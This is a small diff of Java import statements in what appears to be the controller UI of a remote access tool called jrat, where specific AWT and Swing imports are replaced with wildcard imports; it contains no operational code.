@@ -4,12 +4,12 @@ import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet19ListProcesses;
 import jrat.controller.ui.panels.PanelControlRemoteProcess;
 
-import java.awt.Toolkit;
+import javax.swing.*;
+import java.awt.*;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
 import java.util.Map;
-import javax.swing.JFrame;
 
 
 @SuppressWarnings("serial")
